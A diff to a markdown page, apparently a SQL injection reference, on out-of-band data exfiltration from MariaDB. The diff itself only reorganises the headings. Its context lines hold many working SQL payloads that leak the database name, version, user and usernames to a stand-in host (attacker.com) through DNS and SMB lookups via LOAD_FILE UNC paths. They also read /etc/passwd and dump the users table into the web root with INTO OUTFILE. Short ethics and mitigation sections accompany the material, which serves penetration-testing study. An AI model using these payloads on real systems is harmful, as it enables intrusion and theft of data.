@@ -7,18 +7,16 @@ tags: ["OOB", "exfiltration", "DNS", "HTTP"]
 lastUpdated: 2025-12-18
 ---
 
-## Out of Band Channeling
-
 Out-of-band (OOB) channeling refers to techniques that exfiltrate data through channels other than the application's normal response. This approach is extremely valuable in blind SQL injection scenarios where no data is returned in the application's response.
 
-### When to Use OOB Techniques
+## When to Use OOB Techniques
 
 - Blind SQL injection scenarios where no output is visible
 - Cases where application responses are filtered or truncated
 - When the regular injection process is too slow or limited
 - When firewall rules block traditional SQL injection but allow outbound connections
 
-### Prerequisites
+## Prerequisites
 
 Before attempting OOB techniques, verify capabilities:
 
@@ -38,11 +36,11 @@ SELECT @@local_infile AS enabled
 SELECT LOAD_FILE('/etc/passwd') AS test
 ```
 
-### MariaDB OOB Methods
+## MariaDB OOB Methods
 
 MariaDB offers several mechanisms for out-of-band data exfiltration:
 
-#### 1. DNS Exfiltration
+### 1. DNS Exfiltration
 
 DNS exfiltration works by forcing MariaDB to perform DNS lookups for domain names containing the extracted data:
 
@@ -54,7 +52,7 @@ This causes MariaDB to resolve a subdomain like `5f4dcc3b5aa765d61d8327deb882cf9
 
 > **Platform Dependency:** UNC paths (e.g., `\\attacker.com\share`) leverage Windows SMB/NetBIOS behavior and are **primarily effective on Windows systems**. On Linux/Unix, this technique typically does not work unless Samba/SMB client libraries are installed and properly configured (which is uncommon for database servers). Default Linux MariaDB deployments will simply return NULL for UNC path LOAD_FILE calls without triggering DNS lookups.
 
-##### DNS Path Construction Examples
+#### DNS Path Construction Examples
 
 ```sql
 -- Exfiltrate database name
@@ -67,7 +65,7 @@ SELECT CONCAT('\\\\', REPLACE(VERSION(), '.', '-'), '.version.attacker.com\\shar
 SELECT CONCAT('\\\\', SUBSTRING_INDEX(USER(), '@', 1), '.user.attacker.com\\share') AS dns_path
 ```
 
-#### 2. SMB Shares Exfiltration
+### 2. SMB Shares Exfiltration
 
 Using UNC paths to connect to SMB shares (Windows environments):
 
@@ -79,7 +77,7 @@ SELECT LOAD_FILE('\\\\attacker.com\\share\\file')
 SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', DATABASE(), '\\file'))
 ```
 
-#### 3. Note on HTTP Exfiltration
+### 3. Note on HTTP Exfiltration
 
 `LOAD_FILE()` **cannot** fetch HTTP URLs - it only reads local filesystem paths (and UNC paths on Windows for SMB/DNS exfiltration). This is a common misconception.
 
@@ -104,7 +102,7 @@ SELECT CONCAT(
 ) INTO OUTFILE '/var/www/html/exfil_url.txt';
 ```
 
-#### 4. File-based Exfiltration
+### 4. File-based Exfiltration
 
 If you have the FILE privilege:
 
@@ -114,16 +112,16 @@ SELECT * FROM users INTO OUTFILE '/var/www/html/exported_data.txt';
 -- Then retrieve it via HTTP or another method
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Basic DNS Exfiltration
+### Basic DNS Exfiltration
 
 ```sql
 -- Exfiltrate MariaDB version via DNS
 SELECT LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.version.attacker.com\\share\\file'));
 ```
 
-#### Data Extraction via DNS
+### Data Extraction via DNS
 
 ```sql
 -- Extract usernames character by character
@@ -131,7 +129,7 @@ SELECT LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.version.attacker.com\\shar
 SELECT LOAD_FILE(CONCAT('\\\\', (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1), '.char1.attacker.com\\share\\file'));
 ```
 
-### Required Setup
+## Required Setup
 
 To capture this data, you need:
 
@@ -139,7 +137,7 @@ To capture this data, you need:
 2. A DNS server configured to log all requests (or a service like Burp Collaborator)
 3. Proper network connectivity (the MariaDB server must be able to resolve external domains)
 
-### Ethical and Legal Considerations
+## Ethical and Legal Considerations
 
 Out-of-band exfiltration techniques can extract sensitive data without visible application responses. Use these techniques responsibly:
 
@@ -150,9 +148,9 @@ Out-of-band exfiltration techniques can extract sensitive data without visible a
 - Consider legal implications in your jurisdiction - data exfiltration may have specific legal consequences
 - Report findings through proper responsible disclosure channels
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### Encoding Data for DNS Transport
+### Encoding Data for DNS Transport
 
 For complex data, consider encoding to avoid invalid DNS characters:
 
@@ -167,7 +165,7 @@ SELECT CONCAT('\\\\', LOWER(HEX(SUBSTRING_INDEX(USER(), '@', 1))), '.hex.user.at
 SELECT REPLACE(REPLACE(REPLACE('data with spaces.and" dots', ' ', '-'), '.', '-'), '"', '') AS dns_safe
 ```
 
-#### Character-by-Character Extraction
+### Character-by-Character Extraction
 
 Extract data one character at a time using ASCII values:
 
@@ -189,7 +187,7 @@ SELECT CONCAT_WS('-',
 -- Returns: 116-101-115-116 (t-e-s-t)
 ```
 
-#### Chunking Large Data
+### Chunking Large Data
 
 DNS labels have a maximum length of 63 characters, so chunk longer strings:
 
@@ -208,7 +206,7 @@ SELECT CEILING(LENGTH('a_very_long_string_that_needs_chunking') / 10) AS num_chu
 SELECT LEFT(REPEAT('a', 100), 63) AS truncated
 ```
 
-#### DNS Label Validation
+### DNS Label Validation
 
 DNS labels must follow specific rules:
 
@@ -225,7 +223,7 @@ SELECT 'data with spaces' REGEXP '^[a-zA-Z0-9-]+$' AS is_valid
 -- Returns: 0 (false)
 ```
 
-#### Data Extraction Subqueries
+### Data Extraction Subqueries
 
 Techniques for extracting data via subqueries:
 
@@ -245,7 +243,7 @@ SELECT (SELECT table_name FROM information_schema.tables
 SELECT (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) AS all_users
 ```
 
-#### Complete OOB Payload Examples
+### Complete OOB Payload Examples
 
 Full payload construction for real-world use:
 
@@ -270,7 +268,7 @@ SELECT
   CONCAT('\\\\', SUBSTRING(DATABASE(), 11, 10), '.c2.attacker.com\\s') AS chunk2
 ```
 
-### Limitations
+## Limitations
 
 1. DNS queries are generally limited to 253 characters
 2. Some environments block outbound DNS or HTTP requests
@@ -278,15 +276,15 @@ SELECT
 4. Network latency and DNS caching can slow down extraction
 5. Extracted data must be valid in DNS names (alphanumeric, hyphens)
 
-### Mitigation
+## Mitigation
 
-#### Primary Defenses (Prevent SQL Injection)
+### Primary Defenses (Prevent SQL Injection)
 
 1. **Use prepared statements and parameterized queries** - The most effective defense against SQL injection, though they don't stop exfiltration if an injection already exists
 2. **Strict input validation** - Validate and sanitize all user inputs at application boundaries
 3. **Least-privilege database accounts** - Applications should connect with minimal required permissions
 
-#### OOB-Specific Controls
+### OOB-Specific Controls
 
 **Database-Level:**
 
